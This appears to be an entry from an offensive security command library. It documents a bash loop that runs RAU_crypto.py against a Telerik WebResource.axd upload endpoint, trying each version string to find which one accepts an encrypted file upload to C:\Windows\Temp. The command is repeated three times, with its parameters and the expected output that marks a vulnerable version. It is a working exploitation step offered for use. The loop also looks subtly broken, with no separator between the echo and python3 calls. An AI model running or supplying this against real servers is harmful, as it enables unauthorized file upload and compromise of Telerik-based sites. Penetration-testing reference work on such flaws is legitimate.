---
id: cmd-loop-versions
data: >-
  for VERSION in $(cat versions.txt); do echo -n "$VERSION: " python3
  RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt
  https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau
  2>/dev/null | grep fileInfo || echo; done
tags:
  - version-detection
  - upload
type: command
output: 'For vulnerable version: JSON with fileInfo; otherwise empty or error'
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:33.142Z'
verified: false
validated: true
submitted: true
---
# loop-through-versions-for-upload

## Command

```bash
for VERSION in $(cat versions.txt); do echo -n "$VERSION: " python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo; done
```

## Description

Loops through Telerik versions from versions.txt, attempts encrypted file upload using RAU_crypto.py, and checks for successful fileInfo response to detect the vulnerable version.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| versions.txt | File listing possible Telerik versions | Yes |
| -P | Server destination path | Yes |
| $VERSION | Version string for encryption | Yes (looped) |
| testfile.txt | File to upload | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
for VERSION in $(cat versions.txt); do echo -n "$VERSION: " python3 RAU_crypto.py -P 'C:\Windows\Temp' "$VERSION" testfile.txt https://target/apps/XTRAHome/Telerik.Web.UI.WebResource.axd?type=rau 2>/dev/null | grep fileInfo || echo; done
```

### Advanced Usage

Modify path or suppress more output as needed.

## Expected Output

Output like '2016.2.607: {"fileInfo": {...}}' for vulnerable version; empty lines for others.

## Related

- [[commands/create-test-file]]
